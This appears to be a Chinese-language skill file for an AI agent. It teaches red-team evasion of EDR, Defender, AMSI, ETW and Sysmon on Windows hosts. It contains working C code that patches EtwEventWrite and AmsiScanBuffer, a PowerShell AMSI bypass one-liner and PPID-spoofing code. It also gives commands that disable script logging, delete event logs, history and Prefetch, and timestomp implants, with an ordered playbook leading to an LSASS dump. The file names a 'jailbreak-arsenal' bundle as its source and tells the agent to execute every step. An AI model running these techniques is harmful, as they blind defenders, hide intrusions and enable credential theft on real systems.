---
name: edr-bypass-re
description: 逆向防御方实现 → 红队针对性绕过。把 EDR / Defender / AV 的 hook 表、ETW provider、AMSI 实现先逆向出来， 再写针对性的 unhook / 间接 syscall / ETW patch / call stack spoof。对照 MITRE ATT&CK T1562 防御规避。 触发关键词：EDR 绕过、AV bypass、免杀、unhook、direc
whenToUse: 逆向防御方实现 → 红队针对性绕过
source: dsh-jailbreak-arsenal@1.7.0 bundled_skills（已按本仓格式改写，非照抄）
---
# edr-bypass-re

## 适用范围

红队 / 对抗模拟在已获授权的目标主机投递 implant 并躲避现代 EDR 时使用本 skill。

1. **红队 / Purple team / 对抗演练** — 客户希望评估 SOC 与 EDR 的真实检测能力
2. **自研 implant / C2 框架研发** — 开发针对自家产品测试的载荷，需要绕过自家或目标 EDR
3. **EDR 产品评估** — 在合规边界已确认的前提下，客观评测某款 EDR 的检测覆盖
4. **CTF / 攻防演练的 Windows 端突破** — 比赛中需要在加固主机上稳定执行

**不适用场景**：

- 杀毒厂商对自家产品做完整 RE 给客户出商业评估报告（找厂商正式合作）
- 未授权目标的免杀对抗（违法）
- 普通病毒木马的免杀（本 skill 关注红队 OPSEC，不教恶意代码写法）

### 与其他 skill 的分工

| 场景 | 用什么 |
|------|--------|
| 全链路攻防（从外网打到域控） | `attack-chain/` |
| 内网横向 / AD 攻击 | `pentest-tools/network-attack-defense.md` |
| 在某个特定主机上要过 EDR 投递 implant | **本 skill** |
| 单纯静态免杀（混淆 / 加壳） | `malware-analysis/`（反向视角） |

`attack-chain` 关注完整 kill chain，本 skill 只聚焦 **EDR 这一个对手** 的内部机制和针对性绕法。

## 核心原理

```text
EDR 的四个主要监控面               红队的对策
─────────────────────              ─────────────────────
用户态 ntdll hook       ◄──►   unhook (Peruns Fart / fresh ntdll)
                                  间接 syscall / Hell's Gate
                                  hardware breakpoint Blindside

kernel callback         ◄──►   call stack spoof
(Ps/Cm/Ob 系列)                   走合法触发链（不直接绕，配合上游隐身）

ETW telemetry           ◄──►   EtwEventWrite patch
(Microsoft-Windows-Threat-          NtTraceControl 关 provider
 Intelligence 等)                  AmsiContext 同步处理

AMSI 扫描               ◄──►   AmsiScanBuffer patch (mov eax,0x80070057; ret)
(amsi.dll)                       hardware breakpoint 旁路
                                  reflective 加载副本 amsi.dll
```

关键认知：

- **EDR 不是黑盒** — 关键 hook / callback / provider 都能用 IDA + windbg 逆出来
- **绕过技术要组合使用** — 单独一个 unhook 解决不了 ETW 告警，单独 AMSI patch 解决不了 syscall hook
- **顺序很重要** — 先 ETW patch → 再 AMSI patch → 再 unhook；顺序错了 EDR 先收到 unhook 告警
- **现代 EDR 已经把 ETW + kernel callback 当主战场**，单纯用户态 unhook 早已不够

## 工作流

### Step 1：识别目标主机的 EDR

```powershell
# 列出常见 EDR / AV 驱动
Get-Service | Where-Object {$_.Name -match 'CSAgent|SentinelAgent|elasticendpoint|esets|ekrn|MsMpEng|wdsvc|cyserver|sysmon|aswbidsagent'}

# 列出加载的 minifilter
fltmc filters

# 列出已注册的内核 callback（需 windbg + 内核调试 / 或用 PChunter / DRVHV）
# !object \Callback
# !pnpcallback / Process / Thread / Image
```

EDR 指纹表见 `references/hook-survey.md` 顶部。

### Step 2：从 EDR DLL 提 hook 表

1. attach 到一个被注入 EDR 用户态组件的进程（任何已落地进程）
2. 在 windbg 中 dump 当前 `ntdll.dll` 的 `.text` 段
3. 与磁盘上干净的 `C:\Windows\System32\ntdll.dll` 做 diff
4. 不一致的地方就是 hook 点

或者直接用 `pe-sieve`：

```powershell
pe-sieve64.exe /pid 1234 /shellc 3 /modules 3 /dir hooks_dump
```

详细方法见 `references/hook-survey.md`。

### Step 3：选绕过技术组合

| 防御点 | 推荐绕法 |
|--------|---------|
| ntdll inline hook | indirect syscall + 动态 SSN (Halo's Gate) |
| ETW-TI provider | EtwEventWrite head patch |
| AMSI（PowerShell / .NET） | AmsiScanBuffer patch 或 HWBP |
| kernel callback | call stack spoof + 走 legit gadget |
| Sysmon ProcessCreate | PPID spoof + unbacked memory |

### Step 4：在 implant 中实现

代码骨架见 `references/unhook-techniques.md` 与 `references/telemetry-blinding.md`。

### Step 5：本地 sandbox 验证

```powershell
# 在隔离环境部署目标 EDR 试用版（Defender 默认即可起步）
# 启用 Sysmon + olaf-config
sysmon64.exe -i sysmonconfig.xml

# 跑 implant，看是否触发以下告警源：
#   - Defender AMSI
#   - ETW-TI
#   - Sysmon Event ID 1/7/8/10
#   - EDR 控制台
```

### Step 6：投递

- 文件落地路径用合法软件目录
- PPID spoof 到 explorer.exe
- 配合 `attack-chain` 中的 initial access 节

## 典型场景

### 场景 1：投递 cobalt-strike-alike beacon 过 Defender + Sysmon

```text
目标：Windows 11 Enterprise + Defender (云查杀开) + Sysmon (olaf 配置)
要求：beacon 落地后能 callback 且不触发任何告警

组合拳：
  1. shellcode 加密存储，运行时解密
  2. AMSI patch（如果走 PowerShell 投递）
  3. EtwEventWrite patch（消 ETW-TI）
  4. 间接 syscall + Halo's Gate（消 ntdll hook 告警）
  5. PPID spoof 到 explorer.exe
  6. sleep 阶段用 Ekko / Foliage 加密自身内存
```

### 场景 2：在已落地的低权限 shell 上做 EDR sleep mask

```text
前置：已经通过 phishing 拿到 medium IL shell，EDR 正在监控
风险：长时间驻留容易被内存扫描发现 beacon 特征

解法：
  1. 不再申请新 RWX 内存
  2. sleep 期间用 Ekko：
       - WaitForSingleObjectEx + CreateTimerQueueTimer
       - 在定时器里加密自身 .text + 把堆栈刷成全 0
  3. wake 时用 ROP 还原
  4. 配合 call stack spoof 让 RtlCaptureStackBackTrace 看不到信标地址
```

## 路由上下文

**上游入口**：

- `reverse-engineering/` — 需要先理解 EDR DLL / 驱动的实现
- `attack-chain/` — 决定在 kill chain 的哪个阶段引入本 skill

**同级关联**：

- `pentest-tools/network-attack-defense.md` — 内网横向时如何与本 skill 联动
- `malware-analysis/` — 反向视角，看检测方怎么写规则
- `落地记录/` — 每次实战后回写经验

**下游交付**：

- 生成报告时引用 MITRE ATT&CK **T1562 (Impair Defenses)**、T1562.001 (Disable or Modify Tools)、T1562.006 (Indicator Blocking)、T1055 (Process Injection)、T1027 (Obfuscated Files or Information)

- 仅限合法授权的红队 / 对抗演练 / 自有产品测试
- 操作前必须取得书面授权（SoW / 测试合同 / SRC 范围说明）
- 不得用于未授权目标，不得超出授权范围
- 发现高危问题立即向客户报告，遵循负责任披露
- 所有报告中真实目标信息必须脱敏（IP / 主机名 / 域名 / 凭证占位）

## 参考资料

- 详细 hook 调研：`references/hook-survey.md`
- unhook / syscall 技术：`references/unhook-techniques.md`
- ETW / AMSI / 反取证：`references/telemetry-blinding.md`
- MITRE ATT&CK T1562：<https://attack.mitre.org/techniques/T1562/>

## 任务完成自检（声称完成前 MUST 通过）

- [ ] 我是否执行了工作流中的每一步（而不是只阅读）？
- [ ] 我是否基于 工具索引（本机无，以技能内「本机工具实况」为准） 使用了真实工具路径？
- [ ] 我是否产出了可复现证据（命令/脚本/截图/报告）？
- [ ] 我是否完成并回写了 RULES 要求的 Checklist 项？

## 本机工具实况（导入时快照；当前真值用 `npm run toolkit:check` 或 `node scripts/sync-tool-status.mjs` 复核——表会过期，命令不会）

| 工具 | 状态 |
| --- | --- |
| `pe-sieve64` | ❌ 未装（用前先装，或改用等价工具） |
| `sysmon64` | ❌ 未装（用前先装，或改用等价工具） |
| `explorer` | ✓ 已装 |
| `（本机未装）` | ❌ 未装（用前先装，或改用等价工具） |
| `ida` | ❌ 未装（用前先装，或改用等价工具） |
| `windbg` | ❌ 未装（用前先装，或改用等价工具） |

---

## 遥测致盲（上游深度参考）

# 遥测致盲：ETW / AMSI / 反取证

> 仅限授权红队 / 对抗演练 / 自有产品测试，禁止用于未授权目标。

EDR 的检测能力很大程度依赖 ETW（Event Tracing for Windows）与 AMSI（Antimalware Scan Interface）这两条遥测管道。
本文档汇总针对这两条管道的红队对策，并补充 Sysmon / PowerShell logging / 时间戳 spoof 等反取证组合。

对照 MITRE ATT&CK：T1562.001 / T1562.002 / T1562.006 / T1070 / T1027。

## 1. ETW 内部结构

ETW 是 Windows 内置的高性能事件追踪框架，EDR 用它做"轻量内核遥测"。
红队最关心的 provider：

| Provider GUID | 名称 | 谁在用 |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender、MDE、第三方 EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI 上报 |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | 进程 / 线程基础事件 |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET 加载、JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR 启动 |

### 关键用户态 API

| API | DLL | 作用 |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | 写事件（最常用） |
| `EtwEventWriteFull` | `ntdll.dll` | 带 activity ID 的事件 |
| `EtwEventWriteEx` | `ntdll.dll` | 扩展版本 |
| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite 底层 |
| `NtTraceControl` | `ntdll.dll` | 控制 trace session（启/停/查询 provider） |
| `EtwEventEnabled` | `ntdll.dll` | provider 是否启用 |
| `EtwEventRegister` | `ntdll.dll` | 注册 provider |

### 调用链

```text
应用代码 EventWrite(...)
  → 微软封装 (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (内核)
  → 内核 ETW core → 消费端（EDR 用户态进程订阅 session）
```

## 2. ETW Patch 三种方法

### 方法 A：EtwEventWrite head patch

直接把 `ntdll!EtwEventWrite` 入口改成立即返回成功：

```text
原始：
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

patch 后（x64）：
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C 代码：

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // 注意：VirtualProtect 自身可能被 hook -> 用 indirect syscall 版本
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC 警告**：写 ntdll 内存本身是 ETW-TI 监控的 `ALPC_MODIFY_PROCESS` / `PROTECTVM` 事件源。
必须 **先用 indirect syscall + 绕过 NtProtectVirtualMemory hook 后再 patch**，
否则 patch 还没生效 EDR 就已经收到告警。

### 方法 B：EtwEventEnabled always-false

更隐蔽：不修改 `EtwEventWrite`，而是让 `EtwEventEnabled` 永远返回 FALSE，
应用层会自己判断 "provider 没开" → 不调用 `EtwEventWrite`，对内存 hash 完整性检查更友好（很多 EDR 校验 `EtwEventWrite` 字节）。

```c
// EtwEventEnabled 通常返回 BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### 方法 C：NtTraceControl 关 provider

用 syscall 直接关闭 EDR session（侵入式，但是不动 ntdll 字节）：

```c
// NtTraceControl(EtwpStopTrace, ...)
// 需要 SeSystemProfilePrivilege 或更高
// 适用于 Local Admin + UAC bypass 后
```

实战中较少用，因为：

- 关 session 本身会触发"ETW provider stopped"事件被另一条管道感知
- 需要高权限

### 方法 D：内核态 ETW patch（仅在已有 BYOVD/内核读写时）

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
直接置 0 让所有 ETW-TI 事件被丢弃
```

属于 attack-chain 的 BYOVD 阶段，本 skill 不深入。

## 3. AMSI Bypass

AMSI 是 Windows 提供给 PowerShell / .NET / WMI / VBA 在执行脚本前做反病毒扫描的接口。
红队最常碰到的是 PowerShell + AMSI。

### 经典 AmsiScanBuffer Patch

```c
// amsi.dll!AmsiScanBuffer 入口写：
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32位) 或 ret (64位)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell 一句话版本（仅参考检测对抗，本身被签名 / Defender 拦截）：

```powershell
# 概念演示——真实环境必须配合混淆 / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### 进阶方案 1：Hardware Breakpoint AMSI Bypass

不动 amsi.dll 内存（不会触发完整性扫描）：

1. AddVectoredExceptionHandler
2. 在 `AmsiScanBuffer` 入口设 `DR0`
3. VEH 命中时设置 `RAX = 0x80070057`、`RIP = ret 指令地址`、`RSP += 8`
4. ContinueExecution

与 unhook-techniques.md 的 HWBP Blindside 同一套基础设施，可以共用 VEH。

### 进阶方案 2：AmsiContext / AmsiSession 损坏

构造畸形 `AmsiContext` 结构，让 `AmsiScanBuffer` 内部因为校验失败提前返回 success：

```text
// AmsiContext 头部应该是 "AMSI" 魔数
// 改成 "XXXX" → AmsiScanBuffer 内部校验失败但返回 S_OK + AMSI_RESULT_CLEAN
```

### 进阶方案 3：Reflective 加载副本 amsi.dll

不用系统 amsi.dll，把一份干净副本反射加载到自己进程，并重定向 PowerShell 引擎对 AMSI 的调用。
适用于已经在加载阶段拦截 PowerShell.exe 启动的高级 EDR。

## 4. 反取证：清除痕迹

### PowerShell ScriptBlock Logging 关闭

```powershell
# 注册表（需管理员）
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy 路径：
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### 清 PowerShell history

```powershell
# 当前会话
Clear-History
# 持久化 history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### 清 Prefetch

```powershell
# 需要 SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# 整体清空（动作大，慎用）
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### 清 ETL log

```powershell
# 停 session 后删 etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# 注意：直接删 .evtx 会被 Event Log Service 重新创建并写入 "log cleared" 事件 (Event ID 1102)
# 更隐蔽：内存中 patch wevtsvc.dll 的 EventLog API（属于 T1070.001）
```

### 时间戳 spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon 监控规避

Sysmon 是社区最常见的免费遥测（很多企业用 olaf 配置）。
关键事件：

| Event ID | 含义 |
|----------|------|
| 1 | ProcessCreate（含 PPID、CommandLine、Hash） |
| 7 | ImageLoad（DLL 加载） |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess（OpenProcess） |
| 11 | FileCreate |
| 12/13/14 | 注册表 |
| 22 | DNS Query |
| 25 | ProcessTampering（image hollowing） |

### 规避思路

1. **不创建新进程** — 全部在已注入进程内行动，避开 Event ID 1
2. **PPID Spoof** — 用 `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` 把 PPID 设为 `explorer.exe`，让 Sysmon ProcessCreate 看着合法

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + 不动镜像** — Process Hollowing 在新版 Sysmon 已经被 Event ID 25 捕获。
   首选用 **module stomping**（覆盖已加载合法 DLL 的某节区）或 **dirty vanity** 等较新技术，
   配合 PPID spoof
4. **不要远程线程** — 避免 Event ID 8；用 `NtCreateThreadEx` 在自己进程内执行 / APC / Early Bird APC
5. **DNS 走 DoH / HTTPS** — 避免 Event ID 22

## 6. Call Stack Spoof + 时间戳让事件像合法软件

即使 ProcessCreate 没办法不触发（比如某些场景必须 spawn child），可以：

- 把 CommandLine 改成与某个合法软件相似的格式
- PPID spoof 到 services.exe（伪装 SCM 启动的服务）
- 修改 ImageLoad 看到的 Image hash：通过 module stomping 把 implant 代码放进一个签名 DLL 内存空间
- 配合 CallStackSpoofer：Sysmon 即使开了 EnableCallTracing 也看不到 implant 帧

## 7. 实战 OPSEC：操作顺序

**顺序错了 EDR 会先收到告警**，导致后续动作直接被熔断。

正确顺序：

```text
1. AMSI bypass (HWBP 优先，避免写 amsi.dll)
   ─── 让 .NET / PowerShell 装载 implant 时不被扫
2. ETW patch (先 patch EtwEventWrite，再做任何 syscall)
   ─── 关掉自身后续动作的遥测
3. NtProtectVirtualMemory 用 indirect syscall 调用
   ─── 准备好"安全的"内存权限切换通道
4. Unhook ntdll (Peruns Fart) 或 enable indirect syscall
   ─── 抹掉用户态 hook
5. Call stack spoof setup
   ─── 准备好之后所有 syscall 的伪栈
6. 实际 payload 执行 (注入 / 横向 / dump LSASS)
7. 清痕迹 (PowerShell history / Prefetch / 时间戳)
```

错误顺序示例：

```text
❌ 先 unhook ntdll → ETW-TI 立即上报 PROTECTVM + module modification → SOC 已经收到告警
❌ 先 dump LSASS → AMSI / ETW 都还没压 → 高置信 T1003.001 告警
✅ AMSI → ETW → unhook → spoof → payload
```

## 参考资料

- ETW Threat Intelligence Provider：<https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching 综述：<https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass 大全：<https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf 配置：<https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing：<https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask：<https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation：<https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging)：<https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking)：<https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal)：<https://attack.mitre.org/techniques/T1070/>

## 路由回调

完成本三件套（hook 调研 → unhook → telemetry 致盲）后，回到 `SKILL.md` Step 5 在 sandbox 验证，
然后按 `attack-chain/` 的 initial access 与 lateral movement 章节进入下一阶段。

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：5 内网渗透｜**角色**：`internal`
- **上游**（先做完这些再进来）：`privesc-persistence`、`windows-ad`
- **下游**（产出交给谁）：`threat-hunting`、`lateral-movement`
- **专项下游**（同主题更深的靶子面）：`competition-kernel-container-escape`
- **互补**（同类场景一起用）：`threat-hunting`
- **落库**：本技能不直接产出可落库实体；产出交给下游技能记进演练台

